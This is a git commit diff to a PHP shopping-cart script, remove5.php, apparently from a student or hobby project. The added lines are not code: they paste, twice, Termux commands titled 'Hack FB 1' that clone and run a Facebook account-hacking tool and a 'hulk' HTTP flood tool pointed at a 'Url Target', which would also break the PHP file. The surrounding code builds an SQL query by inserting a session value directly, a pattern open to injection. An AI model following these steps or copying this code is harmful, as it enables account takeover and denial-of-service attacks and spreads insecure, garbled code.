10f35112b11a08ef980311c0e933181ff25a7705
Mayank-Khurmai <mayankkhurmai8@gmail.com>
2019-10-05 17:54:50 +0530

    Update remove5.php

--- remove5.php
+++ remove5.php
@@ -10,8 +10,44 @@ session_start();
     $sql2 = "SELECT * FROM carttable WHERE emailadd='$mysession2'";
     $records2 = mysqli_query($db2, $sql2);
     $details2 = mysqli_fetch_assoc($records2);
- 
-        
+ Hack FB 1
+
+pkg update
+pkg upgrade
+pkg install python2
+pkg install git
+pip2 install requests
+pip2 install mechanize
+git clone https://github.com/SantriCyber/santri-IDN
+cd santri-IDN
+python2 santri-IDN.py
+
+$ apt update && upgrade
+$ pkg install git
+$ pkg install python2
+$ git clone https://github.com/ujjawalsaini3/hulk
+$ cd hulk
+$ chmod +x hulk.py
+$ python2 hulk.py "Url Target"
+        Hack FB 1
+
+pkg update
+pkg upgrade
+pkg install python2
+pkg install git
+pip2 install requests
+pip2 install mechanize
+git clone https://github.com/SantriCyber/santri-IDN
+cd santri-IDN
+python2 santri-IDN.py
+
+$ apt update && upgrade
+$ pkg install git
+$ pkg install python2
+$ git clone https://github.com/ujjawalsaini3/hulk
+$ cd hulk
+$ chmod +x hulk.py
+$ python2 hulk.py "Url Target"
          
 
                 $a = $_SESSION['emailadd'];
